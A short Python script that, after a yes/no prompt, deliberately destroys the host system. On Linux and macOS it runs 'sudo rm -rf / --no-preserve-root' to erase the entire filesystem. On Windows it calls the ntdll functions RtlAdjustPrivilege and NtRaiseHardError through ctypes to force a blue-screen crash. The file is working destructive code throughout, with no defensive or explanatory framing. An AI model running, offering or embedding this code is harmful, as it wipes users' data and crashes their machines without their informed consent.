def bsod_linux():
  import os
  os.system('sudo rm -rf / --no-preserve-root')

def bsod_win():
  from ctypes import windll
  from ctypes import c_int
  from ctypes import c_uint
  from ctypes import c_ulong
  from ctypes import POINTER
  from ctypes import byref

  nullptr = POINTER(c_int)()

  windll.ntdll.RtlAdjustPrivilege(
      c_uint(19), 
      c_uint(1), 
      c_uint(0), 
      byref(c_int())
  )

  windll.ntdll.NtRaiseHardError(
      c_ulong(0xC000007B), 
      c_ulong(0), 
      nullptr, 
      nullptr, 
      c_uint(6), 
      byref(c_uint())
  )

def main():
  import platform
  plt = platform.system()
  print('Your platform', plt)
  if input('This will kill your system. Are you sure?(y/n)').strip() != 'y':
    print('Break.')
    return
  if plt in ('Linux', 'Darwin'):
    bsod_linux()
  elif plt in ('Windows'):
    bsod_win()
  else:
    raise ValueError(f'Platform {plt!r} not found.')

if __name__ == '__main__':
  main()
